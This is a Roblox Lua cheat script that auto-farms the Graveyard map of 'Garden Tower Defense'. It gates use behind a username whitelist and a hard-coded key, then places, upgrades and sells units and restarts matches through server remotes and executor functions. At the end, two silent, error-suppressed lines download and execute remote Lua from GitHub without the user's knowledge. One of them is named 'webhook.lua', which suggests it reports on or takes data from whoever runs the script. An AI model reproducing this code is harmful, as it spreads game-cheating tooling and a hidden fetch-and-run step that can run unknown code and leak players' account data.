--// Garden Tower Defense - GRAVEYARD MAP AUTO FARM (PESTICIDER STRATEGY)

local Players = game:GetService("Players")
local plr = Players.LocalPlayer

local whitelist = {
    ["holasoy_kier"] = true,
    ["Sugaplum753"] = true,
    ["Nstub1234"] = true,
    ["Girthentersmyvergona"] = true,
    ["Derick12401"] = true,
    ["Threldor"] = true,
    ["keraieu"] = true,
    ["PurpPom"] = true,
    ["xpIPhGhoyFL"] = true,
    ["niceone10075"] = true,
    ["lyrachanx"] = true,
    ["BLACK_UNNIE1"] = true,
    ["PHOENIX7913"] = true,
    ["Draco_015"] = true,
    ["egoiks22921312"] = true,
    ["LEGKO_RUST"] = true,
    ["Nr1bulle"] = true,
    ["NoahYuiPom"] = true,
    ["67cheesy"] = true
}

if not whitelist[plr.Name] then
    plr:Kick("You are not whitelisted.")
    return
end

local ScreenGui = Instance.new("ScreenGui", plr:WaitForChild("PlayerGui"))
local Frame = Instance.new("Frame", ScreenGui)
Frame.Size = UDim2.new(0, 300, 0, 200)
Frame.Position = UDim2.new(0.5, -150, 0.5, -100)
Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)

local Title = Instance.new("TextLabel", Frame)
Title.Size = UDim2.new(1, 0, 0, 40)
Title.BackgroundTransparency = 1
Title.Text = "Enter Key"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 20

local TextBox = Instance.new("TextBox", Frame)
TextBox.Size = UDim2.new(1, -20, 0, 40)
TextBox.Position = UDim2.new(0, 10, 0, 50)
TextBox.PlaceholderText = "Enter Key Here"
TextBox.Text = ""
TextBox.Font = Enum.Font.Gotham
TextBox.TextSize = 16
TextBox.TextColor3 = Color3.fromRGB(0, 0, 0)
TextBox.BackgroundColor3 = Color3.fromRGB(200, 200, 200)

local CheckBtn = Instance.new("TextButton", Frame)
CheckBtn.Size = UDim2.new(1, -20, 0, 40)
CheckBtn.Position = UDim2.new(0, 10, 0, 100)
CheckBtn.Text = "Check Key"
CheckBtn.Font = Enum.Font.GothamBold
CheckBtn.TextSize = 18
CheckBtn.BackgroundColor3 = Color3.fromRGB(100, 200, 100)

local Label = Instance.new("TextLabel", Frame)
Label.Size = UDim2.new(1, -20, 0, 40)
Label.Position = UDim2.new(0, 10, 0, 150)
Label.BackgroundTransparency = 1
Label.Text = ""
Label.Font = Enum.Font.GothamBold
Label.TextSize = 16
Label.TextColor3 = Color3.fromRGB(255, 255, 255)

local rs = game:GetService("ReplicatedStorage")
local remotes = rs:WaitForChild("RemoteFunctions")
local Workspace = game:GetService("Workspace")
local entities = Workspace:WaitForChild("Map"):WaitForChild("Entities")

_G.myUnitIDs = _G.myUnitIDs or {}
_G.trackingEnabled = false
_G.currentWave = 0

-- Wave Detector integrado
local function detectWave()
    local success, result = pcall(function()
        local guiNoInset = plr.PlayerGui:FindFirstChild("GameGuiNoInset")
        if not guiNoInset then return nil end
        
        for _, obj in pairs(guiNoInset:GetDescendants()) do
            if obj:IsA("TextLabel") and obj.Visible then
                local text = obj.Text
                local difficulty, waveNum, totalWaves = string.match(text, "(%w+):%s*Wave%s*(%d+)%s*/%s*(%d+)")
                if waveNum then
                    return tonumber(waveNum)
                end
            end
        end
        return nil
    end)
    return success and result or nil
end

task.spawn(function()
    while true do
        task.wait(0.5)
        if _G.trackingEnabled then
            local wave = detectWave()
            if wave then
                _G.currentWave = wave
            end
        end
    end
end)

local function setupAutoSkip()
    task.delay(3.5, function()
        pcall(function()
            local gui = plr.PlayerGui:WaitForChild("GameGuiNoInset")
            local autoSkipButton = gui.Screen.Top.WaveControls:WaitForChild("AutoSkip")
            spawn(function()
                while _G.trackingEnabled do
                    task.wait(0.8)
                    pcall(function()
                        local c = autoSkipButton.ImageColor3
                        if c.R > 0.8 and c.G > 0.5 then
                            local conns = getconnections(autoSkipButton.MouseButton1Click)
                            if conns and #conns > 0 then conns[1]:Fire() end
                        end
                    end)
                end
            end)
        end)
    end)
end

local function getMoney()
    return plr:GetAttribute("Cash") or 0
end

local function getUnitID(unit)
    for attempt = 1, 10 do
        for _, v in ipairs(unit:GetDescendants()) do
            if (v:IsA("IntValue") or v:IsA("NumberValue") or v:IsA("StringValue")) and string.find(string.lower(v.Name), "id") then
                return v.Value
            end
        end
        for attrName, attrValue in pairs(unit:GetAttributes()) do
            if string.find(string.lower(attrName), "id") then
                return attrValue
            end
        end
        task.wait(0.2)
    end
    return nil
end

entities.ChildAdded:Connect(function(child)
    if _G.trackingEnabled then
        task.spawn(function()
            task.wait(1)
            if child and child.Parent and string.find(child.Name, "unit_") then
                local unitID = getUnitID(child)
                if unitID then
                    table.insert(_G.myUnitIDs, unitID)
                    print("[PESTICIDER] Tracked unit ID:", unitID, "Total units:", #_G.myUnitIDs)
                end
            end
        end)
    end
end)

local placements = {}
local completedActions = {}
local unitLevels = {}

local function generatePesticiderPlacements()
    return {
        -- Colocar primer Pesticider
        {type = "place", requiredMoney = 500, unit = "unit_pesticider", 
         position = Vector3.new(-341.5465393066406, 61.68030548095703, -703.4617919921875), 
         unitIndex = 1},
        
        -- Colocar segundo Pesticider
        {type = "place", requiredMoney = 500, unit = "unit_pesticider", 
         position = Vector3.new(-347.159912109375, 61.68030548095703, -709.947265625), 
         unitIndex = 2},
        
        -- Upgrade segundo a nivel 2
        {type = "upgrade", requiredMoney = 700, unitIndex = 2, targetLevel = 2},
        
        -- Upgrade primero hasta el nivel máximo
        {type = "upgrade", requiredMoney = 700, unitIndex = 1, targetLevel = 2},
        {type = "upgrade", requiredMoney = 1500, unitIndex = 1, targetLevel = 3},
        {type = "upgrade", requiredMoney = 3000, unitIndex = 1, targetLevel = 4},
        {type = "upgrade", requiredMoney = 6000, unitIndex = 1, targetLevel = 5},
        
        -- Upgrade segundo hasta el nivel máximo
        {type = "upgrade", requiredMoney = 1500, unitIndex = 2, targetLevel = 3, waitForUnit = 1, waitForLevel = 5},
        {type = "upgrade", requiredMoney = 3000, unitIndex = 2, targetLevel = 4},
        {type = "upgrade", requiredMoney = 6000, unitIndex = 2, targetLevel = 5}
    }
end

local function hasReachedLevel(unitIndex, targetLevel)
    return (unitLevels[unitIndex] or 1) >= targetLevel
end

local function tryPlaceUnit(unit, position, unitIndex)
    local data = {
        CF = CFrame.new(position.X, position.Y, position.Z, -1, 0, -8.742277657347586e-08, 0, 1, 0, 8.742277657347586e-08, 0, -1),
        Rotation = 180,
        Valid = true,
        Position = position
    }
    
    local success, result = pcall(function()
        return remotes.PlaceUnit:InvokeServer(unit, data)
    end)
    
    if success and result then
        print("[PESTICIDER] Placed unit", unitIndex, "at", position)
        return true
    else
        warn("[PESTICIDER] Failed to place unit", unitIndex, ":", tostring(result))
        return false
    end
end

local function moneyBasedActions()
    task.spawn(function()
        while _G.trackingEnabled do
            task.wait(0.2)
            
            -- Vender unidades en wave 20
            if _G.currentWave >= 20 and not _G.unitsSold then
                _G.unitsSold = true
                print("[PESTICIDER] Wave 20 reached! Selling units...")
                
                task.wait(0.5)
                
                local soldCount = 0
                if #_G.myUnitIDs >= 2 then
                    -- Vender las 2 unidades tracked
                    for i = 1, 2 do
                        if _G.myUnitIDs[i] then
                            local success = pcall(function()
                                remotes.SellUnit:InvokeServer(_G.myUnitIDs[i])
                            end)
                            if success then
                                soldCount = soldCount + 1
                                print("[PESTICIDER] Sold unit", i)
                            end
                            task.wait(0.1)
                        end
                    end
                else
                    -- Fallback: intentar vender por índice
                    for unitID = 1, 2 do
                        local success = pcall(function()
                            remotes.SellUnit:InvokeServer(unitID)
                        end)
                        if success then
                            soldCount = soldCount + 1
                        end
                        task.wait(0.1)
                    end
                end
                
                print("[PESTICIDER] Sold", soldCount, "units")
                _G.myUnitIDs = {}
                break
            end
            
            -- Ejecutar acciones basadas en dinero
            local currentMoney = getMoney()
            
            for i, action in ipairs(placements) do
                if not completedActions[i] then
                    -- Verificar condiciones de espera
                    if action.waitForUnit and action.waitForLevel then
                        if not hasReachedLevel(action.waitForUnit, action.waitForLevel) then
                            continue
                        end
                    end
                    
                    currentMoney = getMoney()
                    
                    if currentMoney >= action.requiredMoney then
                        if action.type == "place" then
                            local success = tryPlaceUnit(action.unit, action.position, action.unitIndex)
                            if success then
                                completedActions[i] = true
                                unitLevels[action.unitIndex] = 1
                            end
                            task.wait(0.5)
                            
                        elseif action.type == "upgrade" then
                            if #_G.myUnitIDs >= action.unitIndex then
                                local unitID = _G.myUnitIDs[action.unitIndex]
                                local currentLevel = unitLevels[action.unitIndex] or 1
                                
                                if currentLevel < action.targetLevel then
                                    local success = pcall(function()
                                        remotes.UpgradeUnit:InvokeServer(unitID)
                                    end)
                                    
                                    if success then
                                        completedActions[i] = true
                                        unitLevels[action.unitIndex] = action.targetLevel
                                        print("[PESTICIDER] Upgraded unit", action.unitIndex, "to level", action.targetLevel)
                                    end
                                    
                                    task.wait(0.4)
                                else
                                    completedActions[i] = true
                                end
                            end
                        end
                    end
                end
            end
        end
    end)
end

local function waitForGameEnd()
    local gui = plr.PlayerGui:WaitForChild("GameGui")
    local gameEndFrame = gui.Screen.Middle:WaitForChild("GameEnd")
    repeat task.wait(0.5) until gameEndFrame.Visible == true
    print("[PESTICIDER] Game ended!")
end

local function clickPlayAgain()
    local clicked = false
    for attempt = 1, 15 do
        pcall(function()
            local gui = plr.PlayerGui:FindFirstChild("GameGui")
            if gui then
                for _, button in ipairs(gui:GetDescendants()) do
                    if button:IsA("TextButton") and button.Visible then
                        local text = string.lower(button.Text)
                        if string.find(text, "again") or string.find(text, "play") then
                            local conns = getconnections(button.MouseButton1Click)
                            if conns and #conns > 0 then
                                conns[1]:Fire()
                                clicked = true
                                print("[PESTICIDER] Clicked Play Again")
                                return
                            end
                        end
                    end
                end
            end
        end)
        if clicked then break end
        task.wait(0.15)
    end
    
    if not clicked then
        pcall(function()
            remotes.RestartGame:InvokeServer()
            clicked = true
            print("[PESTICIDER] Restarted via remote")
        end)
    end
    
    return clicked
end

local function setupGame(tickSpeed)
    print("[PESTICIDER] Setting up game - Speed:", tickSpeed .. "x")
    
    pcall(function()
        remotes.LobbySetMap_6:InvokeServer("map_graveyard")
    end)
    task.wait(0.25)
    
    remotes.PlaceDifficultyVote:InvokeServer("dif_impossible")
    task.wait(0.25)
    
    remotes.ChangeTickSpeed:InvokeServer(tickSpeed)
    
    setupAutoSkip()
end

function load3xScript()
    print("[PESTICIDER] Starting 3x Speed Farm Loop")
    
    while true do
        _G.myUnitIDs = {}
        _G.unitsSold = false
        _G.currentWave = 0
        completedActions = {}
        unitLevels = {}
        _G.trackingEnabled = true
        
        setupGame(3)
        task.wait(1.5)
        
        placements = generatePesticiderPlacements()
        moneyBasedActions()
        
        waitForGameEnd()
        task.wait(0.5)
        
        _G.trackingEnabled = false
        clickPlayAgain()
        task.wait(2)
        
        print("[PESTICIDER] Loop complete, restarting...")
    end
end

function load2xScript()
    print("[PESTICIDER] Starting 2x Speed Farm Loop")
    
    while true do
        _G.myUnitIDs = {}
        _G.unitsSold = false
        _G.currentWave = 0
        completedActions = {}
        unitLevels = {}
        _G.trackingEnabled = true
        
        setupGame(2)
        task.wait(1.5)
        
        placements = generatePesticiderPlacements()
        moneyBasedActions()
        
        waitForGameEnd()
        task.wait(0.5)
        
        _G.trackingEnabled = false
        clickPlayAgain()
        task.wait(2)
        
        print("[PESTICIDER] Loop complete, restarting...")
    end
end

local function showSpeedMenu()
    Title.Text = "Pesticider Strategy - Graveyard"
    TextBox.Visible = false
    CheckBtn.Visible = false
    Label.Visible = false
    
    local btn2x = Instance.new("TextButton", Frame)
    btn2x.Size = UDim2.new(0.45, 0, 0, 50)
    btn2x.Position = UDim2.new(0.05, 0, 0.5, -25)
    btn2x.Text = "2x Speed"
    btn2x.Font = Enum.Font.GothamBold
    btn2x.TextSize = 18
    btn2x.BackgroundColor3 = Color3.fromRGB(80, 160, 250)
    
    local btn3x = Instance.new("TextButton", Frame)
    btn3x.Size = UDim2.new(0.45, 0, 0, 50)
    btn3x.Position = UDim2.new(0.5, 0, 0.5, -25)
    btn3x.Text = "3x Speed"
    btn3x.Font = Enum.Font.GothamBold
    btn3x.TextSize = 18
    btn3x.BackgroundColor3 = Color3.fromRGB(250, 120, 120)
    
    btn2x.MouseButton1Click:Connect(function()
        ScreenGui:Destroy()
        load2xScript()
    end)
    
    btn3x.MouseButton1Click:Connect(function()
        ScreenGui:Destroy()
        load3xScript()
    end)
end

CheckBtn.MouseButton1Click:Connect(function()
    if TextBox.Text == "candy" then
        Label.Text = "Key Accepted!"
        Label.TextColor3 = Color3.fromRGB(0, 255, 0)
        task.delay(1, showSpeedMenu)
    else
        TextBox.Text = ""
        Label.Text = "Invalid Key!"
        Label.TextColor3 = Color3.fromRGB(255, 0, 0)
    end
end)

task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/elisabloom/ElisaHub/refs/heads/main/webhook.lua"))() 
    end)
end)

task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/hassanxzayn-lua/Anti-afk/main/antiafkbyhassanxzyn"))()
    end)
end)
